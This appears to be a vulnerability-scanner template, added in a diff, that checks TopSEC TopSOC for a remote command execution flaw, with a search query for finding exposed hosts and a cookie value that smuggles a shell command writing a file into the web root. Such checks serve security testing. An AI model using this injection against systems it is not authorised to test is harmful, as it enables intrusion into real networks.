@@ -1,0 +1,37 @@
+id: TOPSEC-TopSOC-maincgi-RCE
+
+info:
+  name: 天融信TOPSEC安全管理系统(TopSOC)RCE漏洞
+  author: linfeng7z
+  severity: critical
+  description: 天融信TopSec安全管理系统存在存在远程命令执行漏洞，通过此漏洞，攻击者可进行文件写入等危险操作
+  tags: rce,topsoc,topsec
+  metadata:
+    fofa-qeury: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
+    veified: true
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
+
+http:
+  - raw:
+      - |
+        @timeout: 10
+        GET /cgi/maincgi.cgi?Url=check HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Cookie: session_id_443=1|echo 'Vulnerable test' > /www/htdocs/site/image/{{file_name}};
+        Connection: close
+
+      - |
+        @timeout: 10
+        GET /site/image/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, 'Vulnerable test')"
+          - "status_code_1 == 200 && status_code_2 == 200"
+        condition: and
